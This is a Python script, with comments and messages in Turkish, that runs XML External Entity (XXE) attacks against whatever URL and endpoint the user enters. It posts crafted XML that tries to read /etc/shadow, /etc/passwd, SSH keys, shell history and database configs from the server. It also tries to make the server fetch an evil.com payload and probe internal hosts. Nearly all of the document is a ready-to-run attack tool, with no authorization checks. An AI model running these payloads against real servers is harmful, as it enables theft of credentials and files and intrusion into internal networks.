import requests
import xml.etree.ElementTree as ET

class AdvancedXXETester:
    def __init__(self, base_url, endpoint):
        self.base_url = base_url
        self.endpoint = endpoint

    def create_payload(self, entity_type, target):
        """Creates XML payloads for different XXE attack scenarios."""
        if entity_type == 'file':
            return f"""<?xml version='1.0' encoding='UTF-8'?>
            <!DOCTYPE foo [
                <!ENTITY xxe SYSTEM '{target}'>
            ]>
            <foo>&xxe;</foo>"""
        elif entity_type == 'url':
            return f"""<?xml version='1.0' encoding='UTF-8'?>
            <!DOCTYPE foo [
                <!ENTITY xxe SYSTEM '{target}'>
            ]>
            <foo>&xxe;</foo>"""
        else:
            return f"""<?xml version='1.0' encoding='UTF-8'?>
            <foo><bar>Test</bar></foo>"""

    def test_xxe(self, payload):
        """Sends XML payload to the server and processes the response."""
        test_url = f"{self.base_url}{self.endpoint}"
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(test_url, data=payload, headers=headers)
        
        # Detailed response processing
        return self.process_response(response)

    def process_response(self, response):
        """Processes and analyzes server's response to detect XXE vulnerabilities."""
        status_code = response.status_code
        response_text = response.text

        print(f"[INFO] Yanıt kodu: {status_code}")

        # Detailed analysis of the response
        if status_code == 200:
            if "error" in response_text.lower():
                print("[ERROR] Hata mesajı alındı.")
            else:
                # Check for sensitive information exposure
                keywords = ["passwd", "shadow", "hosts", "hostname", "secret", "private", "config"]
                if any(keyword in response_text.lower() for keyword in keywords):
                    print("[WARNING] Hassas bilgi sızması tespit edildi.")
                else:
                    print(f"[SUCCESS] Yanıt içeriği: {response_text[:1000]}")  # İlk 1000 karakteri göster
        elif status_code in [400, 500]:
            print(f"[ERROR] Sunucu hata kodu: {status_code}")
        else:
            print(f"[INFO] Yanıt kodu: {status_code}, Yanıt: {response_text[:500]}")  # İlk 500 karakteri göster

    def run_tests(self, payloads):
        """Runs a series of XXE tests with different payloads and analyzes responses."""
        for payload_type, payload in payloads:
            print(f"\n[INFO] Test ediliyor: {payload_type} - {payload}")
            xml_payload = self.create_payload(payload_type, payload)
            self.test_xxe(xml_payload)

if __name__ == "__main__":
    # Kullanıcıdan URL ve endpoint bilgilerini al
    base_url = input("Test edilecek URL'yi girin (örnek: http://example.com): ").strip()
    endpoint = input("Endpoint'i girin (örnek: /upload): ").strip()

    # XXE test payload'ları
    payloads = [
        # Dosya Sistemi Erişimi: Kritik sistem dosyalarına erişim testi
        ('file', 'file:///etc/passwd'),
        ('file', 'file:///etc/shadow'),
        ('file', 'file:///etc/hostname'),
        ('file', 'file:///proc/self/environ'),
        ('file', 'file:///etc/hosts'),

        # Dış URL Erişimi: Harici kaynaklardan veri çekmeye çalışma
        ('url', 'http://evil.com/malicious.xml'),
        ('url', 'http://localhost:8000/secret.txt'),
        ('url', 'http://example.com/secret-data'),

        # Diğer test payload'ları: Ekstra hassas veri erişimi ve dış URL denemeleri
        ('file', 'file:///root/.bash_history'),
        ('file', 'file:///var/log/syslog'),
        ('file', 'file:///home/user/.ssh/authorized_keys'),
        ('url', 'http://localhost:8080/malicious-file'),
        ('url', 'http://127.0.0.1:8000/secret-file'),
        ('url', 'http://192.168.1.1/'),

        # XML External Entity Injection for Remote File Inclusion
        ('file', 'file:///etc/mysql/my.cnf'),  # MySQL konfigürasyon dosyası
        ('file', 'file:///var/www/html/index.php'),  # Web sunucu kök dosyası

        # Payload for accessing network resources
        ('url', 'http://localhost:8080/malicious.xml'),  # Yerel sunucuda zararlı XML dosyası
        ('url', 'http://127.0.0.1:8080/secret.txt'),  # Yerel sunucuda gizli bilgi
        ('url', 'http://192.168.1.1:8000/'),  # Yerel ağda IP adresi
    ]

    tester = AdvancedXXETester(base_url, endpoint)
    tester.run_tests(payloads)
